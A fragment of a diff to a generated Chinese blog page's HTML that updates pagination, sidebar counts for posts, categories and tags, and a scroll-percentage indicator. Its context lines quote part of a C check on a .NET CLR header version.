+    <a class="extend prev" rel="prev" href="/page/9/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/9/">9</a><span class="page-number current">10</span><a class="page-number" href="/page/11/">11</a><span class="space">&hellip;</span><a class="page-number" href="/page/13/">13</a><a class="extend next" rel="next" href="/page/11/"><i class="fa fa-angle-right"></i></a>
   </nav>
 
 
@@ -3787,7 +4141,7 @@ if(((pCORHeader->MajorRuntimeVersion>2)|(pCORHeader->MajorRuntimeVerion == 2 && 
             
               <a href="/archives/">
             
-                <span class="site-state-item-count">133</span>
+                <span class="site-state-item-count">125</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
@@ -3798,7 +4152,7 @@ if(((pCORHeader->MajorRuntimeVersion>2)|(pCORHeader->MajorRuntimeVerion == 2 && 
             
             <div class="site-state-item site-state-categories">
               <a href="/categories/index.html">
-                <span class="site-state-item-count">16</span>
+                <span class="site-state-item-count">17</span>
                 <span class="site-state-item-name">分类</span>
               </a>
             </div>
@@ -3809,7 +4163,7 @@ if(((pCORHeader->MajorRuntimeVersion>2)|(pCORHeader->MajorRuntimeVerion == 2 && 
             
             <div class="site-state-item site-state-tags">
               <a href="/tags/index.html">
-                <span class="site-state-item-count">55</span>
+                <span class="site-state-item-count">56</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
@@ -3870,6 +4224,8 @@ if(((pCORHeader->MajorRuntimeVersion>2)|(pCORHeader->MajorRuntimeVerion == 2 && 
       
         <div class="back-to-top">
           <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
           
         </div>
       
